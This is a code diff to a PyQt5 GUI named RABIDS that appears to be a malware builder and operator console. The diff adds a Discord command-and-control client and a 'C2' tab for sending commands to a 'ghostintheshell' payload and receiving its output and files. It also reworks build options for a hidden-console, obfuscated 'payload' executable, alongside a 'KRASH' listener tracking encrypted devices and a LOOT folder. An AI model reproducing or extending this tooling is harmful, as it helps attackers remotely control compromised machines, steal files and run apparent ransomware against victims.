@@ -1,6 +1,7 @@
 import sys
 import os
 from functools import partial
+import re
 import shlex
 import subprocess
 from pathlib import Path
@@ -13,7 +14,7 @@ from PyQt5.QtWidgets import (
 )
 import json
 from PyQt5.QtGui import QFont, QPixmap, QMovie, QIcon
-from PyQt5.QtCore import Qt, QThread, pyqtSignal, QObject
+from PyQt5.QtCore import Qt, QThread, pyqtSignal, QObject, QTimer
 import discord
 import asyncio
 
@@ -126,11 +127,11 @@ class DiscordListener(QObject):
 
         @self.client.event
         async def on_message(message):
-            if message.author == self.client.user:
-                return
-            
-            content = message.content
-            self.process_encryption_message(content)
+            is_dm = isinstance(message.channel, discord.DMChannel)
+            is_from_creator = self.creator_id and str(message.author.id) == self.creator_id
+
+            if is_dm and is_from_creator:
+                self.process_encryption_message(message.content)
 
     async def fetch_history(self, user):
         """Fetches and processes historical messages from a user."""
@@ -152,6 +153,83 @@ class DiscordListener(QObject):
     async def stop_client(self):
         if self.client:
             await self.client.close()
+
+class DiscordC2Client(QObject):
+    """Handles Discord connection and communication for the C2 tab."""
+    log_message = pyqtSignal(str, str)
+    connection_status = pyqtSignal(bool)
+
+    def __init__(self, token, target_user_id):
+        super().__init__()
+        self.token = token
+        self.target_user_id = target_user_id
+        self.target_user = None
+        intents = discord.Intents.default()
+        intents.messages = True
+        intents.dm_messages = True
+        intents.message_content = True
+        self.client = discord.Client(intents=intents)
+
+        @self.client.event
+        async def on_ready():
+            self.log_message.emit(f"C2 client logged in as {self.client.user}", "success")
+            try:
+                self.target_user = await self.client.fetch_user(int(self.target_user_id))
+                self.log_message.emit(f"Connected to target user '{self.target_user.name}'.", "success")
+                self.connection_status.emit(True)
+            except (ValueError, discord.NotFound):
+                self.log_message.emit(f"Could not find target user with ID: {self.target_user_id}", "error")
+                await self.stop_client()
+            except discord.Forbidden:
+                self.log_message.emit("Bot does not have permission to fetch user.", "error")
+                await self.stop_client()
+
+        @self.client.event
+        async def on_message(message):
+            is_dm = isinstance(message.channel, discord.DMChannel)
+            
+            if is_dm:
+                content = message.content.strip()
+                if content:
+                    if content.startswith("```") and content.endswith("```"):
+                        content = re.sub(r"```(plaintext\n)?|```", "", content).strip()
+                    self.log_message.emit(content, "c2_recv")
+                if message.attachments:
+                    for attachment in message.attachments:
+                        self.log_message.emit(f"Received file: <a href='{attachment.url}'>{attachment.filename}</a>", "c2_recv")
+
+    async def send_dm(self, content):
+        if self.target_user:
+            try:
+                sent_content = content.strip()
+                await self.target_user.send(sent_content)
+                self.log_message.emit(sent_content, "c2_sent")
+                return True
+            except discord.Forbidden:
+                self.log_message.emit("Cannot send DMs to this user. Check permissions.", "error")
+                return False
+            except Exception as e:
+                self.log_message.emit(f"Failed to send DM: {str(e)}", "error")
+                return False
+        else:
+            self.log_message.emit("Not connected to a target user.", "error")
+            return False
+
+    async def run_client(self):
+        try:
+            await self.client.start(self.token)
+        except discord.LoginFailure:
+            self.log_message.emit("C2 client login failed. Check the token.", "error")
+            self.connection_status.emit(False)
+        except Exception as e:
+            self.log_message.emit(f"C2 client error: {str(e)}", "error")
+            self.connection_status.emit(False)
+
+    async def stop_client(self):
+        if self.client and self.client.is_ready():
+            await self.client.close()
+            self.log_message.emit("C2 client disconnected.", "system")
+        self.connection_status.emit(False)
 
 class BuildThread(QThread):
     log_signal = pyqtSignal(str, str)
@@ -229,6 +307,34 @@ class DiscordListenerThread(QThread):
             self.loop.call_soon_threadsafe(self.loop.create_task, self.listener.stop_client())
             self.device_status_update.emit("SYSTEM", "Disconnected from Discord.")
 
+class C2Thread(QThread):
+    """Runs the Discord C2 client in a separate thread."""
+    log_message = pyqtSignal(str, str)
+    connection_status = pyqtSignal(bool)
+
+    def __init__(self, token, target_user_id):
+        super().__init__()
+        self.token = token
+        self.target_user_id = target_user_id
+        self.c2_client = None
+        self.loop = None
+
+    def run(self):
+        self.loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(self.loop)
+        self.c2_client = DiscordC2Client(self.token, self.target_user_id)
+        self.c2_client.log_message.connect(self.log_message)
+        self.c2_client.connection_status.connect(self.connection_status)
+        self.loop.run_until_complete(self.c2_client.run_client())
+
+    def send_message(self, content):
+        if self.loop and self.c2_client and self.c2_client.client.is_ready():
+            asyncio.run_coroutine_threadsafe(self.c2_client.send_dm(content), self.loop)
+
+    def stop(self):
+        if self.loop and self.c2_client:
+            asyncio.run_coroutine_threadsafe(self.c2_client.stop_client(), self.loop)
+
 class ModuleTableWidget(QTableWidget):
     """A QTableWidget that supports drag-and-drop row reordering."""
     reorder_signal = pyqtSignal(list)
@@ -272,6 +378,7 @@ class RABIDSGUI(QMainWindow):
         self.loading_movie = None
         self.build_thread = None
         self.discord_thread = None
+        self.c2_thread = None
         self.option_inputs = {}
         self.current_option_values = {}
         self.module_options_group = None
@@ -287,7 +394,8 @@ class RABIDSGUI(QMainWindow):
         }
         QPushButton {
             background-color: #1D1D1F;
-            padding: 8px;
+            padding: 6px;
+            font-size: 10pt;
             border-radius: 10px;
         }
         QPushButton:hover {
@@ -368,55 +476,66 @@ class RABIDSGUI(QMainWindow):
         scroll_area.setWidget(scroll_content_widget)
         module_options_group_layout.addWidget(scroll_area)
         left_layout.addWidget(self.module_options_group, stretch=7)
+        
+        # --- Global Build Options ---
+        build_options_group = QGroupBox("BUILD OPTIONS")
+        build_options_group.setFont(title_font)
+        build_options_layout = QVBoxLayout(build_options_group)
+        build_options_layout.setSpacing(10)
 
-        options_row1 = QHBoxLayout()
-        self.hide_console_check = QCheckBox("HIDE CONSOLE")
-        self.hide_console_check.setFont(subtitle_font)
-        self.hide_console_check.setChecked(True)
-        self.obfuscate_check = QCheckBox("OBFUSCATE")
-        self.obfuscate_check.setFont(subtitle_font)
-        self.obfuscate_check.setChecked(False)
-        self.obfuscate_check.stateChanged.connect(self.toggle_obfuscation)
-        self.ollvm_input = QLineEdit("")
-        self.ollvm_input.setFont(subtitle_font)
-        options_row1.addWidget(self.hide_console_check)
-        options_row1.addWidget(self.obfuscate_check)
-        options_row1.addWidget(self.ollvm_input, 1)
-        left_layout.addLayout(options_row1)
-
-        options_row2 = QHBoxLayout()
+        # EXE Name
+        exe_name_layout = QHBoxLayout()
         exe_name_label = QLabel("EXE NAME")
         exe_name_label.setFont(subtitle_font)
         self.exe_name_input = QLineEdit("payload")
         self.exe_name_input.setFont(subtitle_font)
-        options_row2.addWidget(exe_name_label)
-        options_row2.addWidget(self.exe_name_input, 1)
+        exe_name_layout.addWidget(exe_name_label)
+        exe_name_layout.addWidget(self.exe_name_input, 1)
 
+        # OS and Arch
         target_os_label = QLabel("OS")
         target_os_label.setFont(subtitle_font) 
         self.target_os_combo = QComboBox()
         self.target_os_combo.addItems(["windows", "linux", "macos"])
         self.target_os_combo.setFont(subtitle_font)
         self.target_os_combo.currentTextChanged.connect(self.update_windows_only_options)
-        options_row2.addWidget(target_os_label)
-        options_row2.addWidget(self.target_os_combo, 1)
-
+        exe_name_layout.addWidget(target_os_label)
+        exe_name_layout.addWidget(self.target_os_combo, 1)
         target_arch_label = QLabel("PROCESSOR")
         target_arch_label.setFont(subtitle_font)
         self.target_arch_combo = QComboBox()
         self.target_arch_combo.addItems(["amd64", "arm64"])
         self.target_arch_combo.setFont(subtitle_font)
-        options_row2.addWidget(target_arch_label)
-        options_row2.addWidget(self.target_arch_combo, 1)
-        left_layout.addLayout(options_row2)
+        exe_name_layout.addWidget(target_arch_label)
+        exe_name_layout.addWidget(self.target_arch_combo, 1)
+        build_options_layout.addLayout(exe_name_layout)
+
+        # Windows-specific options
+        win_options_layout = QHBoxLayout()
+        self.hide_console_check = QCheckBox("HIDE CONSOLE")
+        self.hide_console_check.setFont(subtitle_font)
+        self.hide_console_check.setChecked(True)
+        win_options_layout.addWidget(self.hide_console_check)
+
+        self.obfuscate_check = QCheckBox("OBFUSCATE")
+        self.obfuscate_check.setFont(subtitle_font)
+        self.obfuscate_check.setChecked(False)
+        self.obfuscate_check.stateChanged.connect(self.toggle_obfuscation)
+        win_options_layout.addWidget(self.obfuscate_check)
+
+        self.ollvm_input = QLineEdit("")
+        self.ollvm_input.setPlaceholderText("e.g., -fla -sub -bcf")
+        self.ollvm_input.setFont(subtitle_font)
+        win_options_layout.addWidget(self.ollvm_input, 1)
+        build_options_layout.addLayout(win_options_layout)
+        
+        left_layout.addWidget(build_options_group)
 
         build_btn_layout = QHBoxLayout()
-        build_btn_layout.addStretch()
         self.build_btn = QPushButton("BUILD")
         self.build_btn.setFont(subtitle_font)
         self.build_btn.clicked.connect(self.run_compiler)
         build_btn_layout.addWidget(self.build_btn)
-        build_btn_layout.addStretch()
         left_layout.addLayout(build_btn_layout)
 
         banner_layout = QHBoxLayout()
@@ -431,7 +550,6 @@ class RABIDSGUI(QMainWindow):
         self.banner_label.setAlignment(Qt.AlignCenter)
         banner_layout.addWidget(self.banner_label, stretch=1)
         left_layout.addLayout(banner_layout)
-
         builder_layout.addLayout(left_layout, 6)
 
         right_layout = QVBoxLayout()
@@ -445,7 +563,6 @@ class RABIDSGUI(QMainWindow):
         self.module_combo.addItem("SELECT MODULE")
         for module in MODULES.keys():
             self.module_combo.addItem(module.split('/')[-1])
-        self.module_combo.currentTextChanged.connect(self.update_module_description)
         self.module_combo.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Fixed)
         module_select_layout.addWidget(self.module_combo)
 
@@ -454,16 +571,8 @@ class RABIDSGUI(QMainWindow):
         self.add_module_btn.setFont(subtitle_font)
         self.add_module_btn.clicked.connect(self.add_module)
         module_buttons_layout.addWidget(self.add_module_btn)
-        module_buttons_layout.addStretch()
         module_select_layout.addLayout(module_buttons_layout)
         right_layout.addLayout(module_select_layout)
-        self.module_desc_label = QLabel("Select a module to view its description")
-        self.module_desc_label.setFont(subtitle_font)
-        self.module_desc_label.setStyleSheet("color: #F4A87C;")
-        self.module_desc_label.setWordWrap(True)
-        self.module_desc_label.setMaximumWidth(400)
-        self.module_desc_label.setFixedHeight(40)
-        right_layout.addWidget(self.module_desc_label)
 
         module_chain_label = QLabel("MODULE CHAIN")
         module_chain_label.setFont(title_font)
@@ -597,7 +706,6 @@ class RABIDSGUI(QMainWindow):
 
         restore_btn = QPushButton("Restore")
         restore_btn.setFont(subtitle_font)
-        restore_btn.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Fixed)
         restore_btn.clicked.connect(self.run_garbage_collector_restore)
         restore_options_layout.addWidget(restore_btn)
         restore_options_layout.addStretch()
@@ -718,38 +826,17 @@ class RABIDSGUI(QMainWindow):
         live_devices_desc_label.setWordWrap(True)
         left_column_layout.addWidget(live_devices_desc_label)
 
-        listener_layout = QHBoxLayout()
-        listener_label = QLabel("BOT TOKEN ")
-        listener_label.setFont(subtitle_font)
-        listener_label.setStyleSheet("color: #f7f294;")
-        
-        self.listener_token_edit = QLineEdit()
-        self.listener_token_edit.setPlaceholderText("Enter your GUI's Discord bot token here")
-        self.listener_token_edit.setFont(subtitle_font)
-
-        creator_id_label = QLabel("USER ID ")
-        creator_id_label.setFont(subtitle_font)
-        creator_id_label.setStyleSheet("color: #f7f294;")
-
-        self.listener_creator_id_edit = QLineEdit()
-        self.listener_creator_id_edit.setPlaceholderText("Enter your Discord User ID for DMs")
-        self.listener_creator_id_edit.setFont(subtitle_font)
-
+        listener_controls_layout = QHBoxLayout()
         self.toggle_listener_btn = QPushButton("Connect")
         self.toggle_listener_btn.setFont(subtitle_font)
         self.toggle_listener_btn.clicked.connect(self.toggle_discord_listener)
-
         self.refresh_listener_btn = QPushButton("⟳ Refresh")
         self.refresh_listener_btn.setFont(subtitle_font)
         self.refresh_listener_btn.clicked.connect(self.refresh_discord_listener)
-
-        listener_layout.addWidget(listener_label)
-        listener_layout.addWidget(self.listener_token_edit, 1)
-        listener_layout.addWidget(creator_id_label)
-        listener_layout.addWidget(self.listener_creator_id_edit, 1)
-        listener_layout.addWidget(self.refresh_listener_btn)
-        listener_layout.addWidget(self.toggle_listener_btn)
-        left_column_layout.addLayout(listener_layout)
+        listener_controls_layout.addStretch()
+        listener_controls_layout.addWidget(self.refresh_listener_btn)
+        listener_controls_layout.addWidget(self.toggle_listener_btn)
+        left_column_layout.addLayout(listener_controls_layout)
 
         self.encrypted_devices_table = QTableWidget()
         self.encrypted_devices_table.setColumnCount(1)
@@ -770,14 +857,114 @@ class RABIDSGUI(QMainWindow):
 
         uncrash_layout.addLayout(bottom_section_layout)
 
+        # C2 Tab
+        c2_widget = QWidget()
+        c2_main_layout = QHBoxLayout(c2_widget)
+        c2_main_layout.setContentsMargins(15, 15, 15, 15)
+
+        c2_left_column_widget = QWidget()
+        c2_left_layout = QVBoxLayout(c2_left_column_widget)
+        c2_left_layout.setContentsMargins(0, 0, 0, 0)
+        
+        c2_header_layout = QHBoxLayout()
+        c2_title = QLabel("DISCORD C2")
+        c2_title.setFont(title_font)
+        c2_header_layout.addWidget(c2_title)
+        c2_left_layout.addLayout(c2_header_layout)
+
+        c2_desc = QLabel("Connect to Discord to send commands to and receive output from the 'ghostintheshell' payload.")
+        c2_desc.setFont(subtitle_font)
+        c2_desc.setStyleSheet("color: #00A9FD;")
+        c2_desc.setWordWrap(True)
+        c2_left_layout.addWidget(c2_desc)
+
+        self.c2_connect_btn = QPushButton("Connect")
+        self.c2_connect_btn.clicked.connect(self.toggle_c2_connection)
+        c2_left_layout.addWidget(self.c2_connect_btn)
+
+        self.c2_log = QTextEdit()
+        self.c2_log.setReadOnly(True)
+        self.c2_log.setFont(subtitle_font)
+        self.c2_log.setStyleSheet("background-color: #1D1D1F;")
+        c2_left_layout.addWidget(self.c2_log)
+
+        c2_input_layout = QHBoxLayout()
+        self.c2_cmd_input = QLineEdit()
+        self.c2_cmd_input.setPlaceholderText("Enter command to send...")
+        self.c2_cmd_input.returnPressed.connect(self.send_c2_message)
+        self.c2_cmd_input.setEnabled(False)
+
+        self.c2_send_btn = QPushButton("Send")
+        self.c2_send_btn.clicked.connect(self.send_c2_message)
+        self.c2_send_btn.setEnabled(False)
+
+        c2_input_layout.addWidget(self.c2_cmd_input, 1)
+        c2_input_layout.addWidget(self.c2_send_btn)
+        c2_left_layout.addLayout(c2_input_layout)
+
+        c2_image_label = QLabel()
+        c2_image_path = os.path.join(self.script_dir, "ASSETS", "c2.png")
+        pixmap = QPixmap(c2_image_path)
+        if not pixmap.isNull():
+            c2_image_label.setPixmap(pixmap.scaled(300, 800, Qt.KeepAspectRatio, Qt.SmoothTransformation))
+        c2_image_label.setAlignment(Qt.AlignCenter)
+
+        c2_main_layout.addWidget(c2_left_column_widget, 6)
+        c2_main_layout.addWidget(c2_image_label, 4)
+
+        # Settings Tab
+        settings_widget = QWidget()
+        settings_layout = QVBoxLayout(settings_widget)
+        settings_layout.setContentsMargins(15, 15, 15, 15)
+
+        def create_setting_layout(label_text, input_widget, description_text):
+            setting_layout = QVBoxLayout()
+            label_layout = QHBoxLayout()
+            label = QLabel(label_text)
+            label.setFont(subtitle_font)
+            desc_label = QLabel(description_text)
+            desc_label.setFont(QFont("Arial", 8))
+            desc_label.setStyleSheet("color: #808080;")
+            desc_label.setWordWrap(True)
+            label_layout.addWidget(label)
+            setting_layout.addLayout(label_layout)
+            setting_layout.addWidget(input_widget)
+            setting_layout.addWidget(desc_label)
+            setting_layout.addSpacing(10)
+            return setting_layout
+
+        # GUI Listener Settings
+        listener_token_label = QLabel("Listener Bot Token")
+        self.settings_discord_token_edit = QLineEdit()
+        listener_token_desc = "The authentication token for the Discord bot. Used by the KRASH listener and C2 functionality."
+        listener_layout = create_setting_layout(listener_token_label.text(), self.settings_discord_token_edit, listener_token_desc)
+        settings_layout.addLayout(listener_layout)
+
+        listener_creator_id_label = QLabel("Discord User ID")
+        self.settings_listener_creator_id_edit = QLineEdit()
+        listener_creator_id_desc = "Your Discord user ID. The GUI listener bot will only accept commands and DMs from this user."
+        listener_creator_id_layout = create_setting_layout(listener_creator_id_label.text(), self.settings_listener_creator_id_edit, listener_creator_id_desc)
+        settings_layout.addLayout(listener_creator_id_layout)
+
+        # Add stretch to the settings tab for spacing
+        settings_layout.addStretch()
+
+        # Save Settings Button
+        save_settings_btn = QPushButton("Save Settings")
+        save_settings_btn.setFont(subtitle_font)
+        save_settings_btn.clicked.connect(self.save_settings)
+        settings_layout.addWidget(save_settings_btn)
+
+
         self.tab_widget.addTab(builder_widget, "BUILDER")
         self.tab_widget.addTab(output_widget, "OUTPUT")
+        self.tab_widget.addTab(c2_widget, "C2")
         self.tab_widget.addTab(uncrash_widget, "KRASH")
         self.tab_widget.addTab(garbage_collector_widget, "GARBAGE COLLECTOR")
         self.tab_widget.addTab(docs_widget, "DOCUMENTATION")
+        self.tab_widget.addTab(settings_widget, "SETTINGS")
         self.update_loot_folder_view()
         self.update_all_option_values()
-        self.update_module_description("SELECT MODULE")
         self.update_module_table() 
         self.update_options_layout()
         self.update_windows_only_options(self.target_os_combo.currentText())
@@ -819,13 +1006,6 @@ class RABIDSGUI(QMainWindow):
                 self.loot_files_list.addItem(QListWidgetItem(file_path.name))
         except Exception as e:
             self.loot_files_list.addItem(f"Error reading LOOT directory: {e}")
-
-    def update_module_description(self, module_name):
-        if module_name == "SELECT MODULE":
-            self.module_desc_label.setText("Select a module to view its description")
-        else:
-            full_module = f"module/{module_name}"
-            self.module_desc_label.setText(MODULES.get(full_module, {}).get('desc', 'No description available'))
 
     def update_options_layout(self, focused_module=None):
         for i in reversed(range(self.options_layout.count())):
@@ -1071,6 +1251,12 @@ class RABIDSGUI(QMainWindow):
             color = "#FFA473"
         else:
             color = "#00A9FD"
+        
+        if msg_type == "c2_sent":
+            color = "#e0e0e0" # White for sent
+        elif msg_type == "c2_recv":
+            color = "#B7CE42" # Green for received
+
 
         if not message.strip():
             return
@@ -1115,7 +1301,6 @@ class RABIDSGUI(QMainWindow):
 
         self.show_result_view(is_success)
 
-        from PyQt5.QtCore import QTimer
         QTimer.singleShot(3000, self.restore_options_after_build)
 
         self.build_btn.setEnabled(True)
@@ -1286,24 +1471,60 @@ class RABIDSGUI(QMainWindow):
         self.build_thread.finished_signal.connect(self.build_finished)
         self.build_thread.start()
 
+    def toggle_c2_connection(self):
+        if self.c2_thread and self.c2_thread.isRunning():
+            self.c2_thread.stop()
+        else:
+            token = self.settings_discord_token_edit.text().strip()
+            target_id = self.settings_listener_creator_id_edit.text().strip()
+            if not token or not target_id:
+                self.log_c2_message("Bot Token and Target User ID are required.", "error")
+                return
+            
+            self.c2_log.clear()
+            self.log_c2_message("Connecting to Discord...", "system")
+            self.c2_thread = C2Thread(token, target_id)
+            self.c2_thread.log_message.connect(self.log_c2_message)
+            self.c2_thread.connection_status.connect(self.on_c2_connection_status_changed)
+            self.c2_thread.start()
+
+    def on_c2_connection_status_changed(self, is_connected):
+        self.c2_cmd_input.setEnabled(is_connected)
+        self.c2_send_btn.setEnabled(is_connected)
+        if is_connected:
+            self.c2_connect_btn.setText("Disconnect")
+        else:
+            self.c2_connect_btn.setText("Connect")
+            if self.c2_thread:
+                self.c2_thread.quit()
+                self.c2_thread.wait()
+                self.c2_thread = None
+
+    def log_c2_message(self, message, msg_type):
+        # Reusing log_message logic for color, but directing output to c2_log
+        color_map = {"error": "#D81960", "success": "#B7CE42", "system": "#FFA473", "c2_sent": "#e0e0e0", "c2_recv": "#B7CE42", "c2_debug": "#888888"}
+        color = color_map.get(msg_type, "#00A9FD")
+        self.c2_log.append(f'<font color="{color}">{message}</font>')
+
+    def send_c2_message(self):
+        content = self.c2_cmd_input.text().strip()
+        if content and self.c2_thread and self.c2_thread.isRunning():
+            self.c2_thread.send_message(content)
+            self.c2_cmd_input.clear()
+
     def toggle_discord_listener(self):
         if self.discord_thread and self.discord_thread.isRunning():
             self.discord_thread.stop()
-            self.discord_thread.quit()
-            self.discord_thread.wait()
-            self.discord_thread = None
             self.toggle_listener_btn.setText("Connect")
-            self.listener_token_edit.setEnabled(True)
-            self.listener_creator_id_edit.setEnabled(True)
             self.log_message("Discord listener disconnected.", "system")
         else:
-            token = self.listener_token_edit.text().strip()
+            token = self.settings_discord_token_edit.text().strip()
             if not token:
                 self.log_message("Error: Discord listener bot token is required.", "error")
-                self.tab_widget.setCurrentIndex(1)
+                self.tab_widget.setCurrentIndex(self.tab_widget.indexOf(self.tab_widget.findChild(QWidget, "SETTINGS")))
                 return
 
-            creator_id = self.listener_creator_id_edit.text().strip()
+            creator_id = self.settings_listener_creator_id_edit.text().strip()
 
             if self.discord_thread and self.discord_thread.isRunning():
                 self.log_message("Listener is already running.", "system")
@@ -1313,8 +1534,11 @@ class RABIDSGUI(QMainWindow):
             self.discord_thread.device_status_update.connect(self.update_device_status)
             self.discord_thread.start()
             self.toggle_listener_btn.setText("Disconnect")
-            self.listener_token_edit.setEnabled(False)
-            self.listener_creator_id_edit.setEnabled(False)
+
+    def on_discord_listener_status_changed(self, is_connected):
+        self.toggle_listener_btn.setText("Disconnect" if is_connected else "Connect")
+        if not is_connected and self.discord_thread:
+            self.discord_thread = None
 
     def refresh_discord_listener(self):
         if self.discord_thread and self.discord_thread.isRunning():
@@ -1330,9 +1554,7 @@ class RABIDSGUI(QMainWindow):
             if "failed" in status:
                 self.toggle_listener_btn.setText("Connect")
                 self.toggle_listener_btn.setEnabled(True)
-                self.listener_token_edit.setEnabled(True)
-                self.listener_creator_id_edit.setEnabled(True)
-
+                self.on_discord_listener_status_changed(False)
         for row in range(self.encrypted_devices_table.rowCount()):
             item = self.encrypted_devices_table.item(row, 0)
             if item and item.text() == hostname:
@@ -1397,8 +1619,8 @@ class RABIDSGUI(QMainWindow):
                 "output_dir": self.restore_output_dir_edit.text()
             },
             "listener": {
-                "token": self.listener_token_edit.text(),
-                "creator_id": self.listener_creator_id_edit.text()
+                "token": self.settings_discord_token_edit.text(),
+                "creator_id": self.settings_listener_creator_id_edit.text()
             }
         }
         try:
@@ -1438,8 +1660,8 @@ class RABIDSGUI(QMainWindow):
             self.restore_output_dir_edit.setText(gc_cfg.get("output_dir", ""))
 
             listener_cfg = config.get("listener", {})
-            self.listener_token_edit.setText(listener_cfg.get("token", ""))
-            self.listener_creator_id_edit.setText(listener_cfg.get("creator_id", ""))
+            self.settings_discord_token_edit.setText(listener_cfg.get("token", ""))
+            self.settings_listener_creator_id_edit.setText(listener_cfg.get("creator_id", ""))
 
         except (json.JSONDecodeError, KeyError) as e:
             print(f"Error loading settings from config file: {e}")
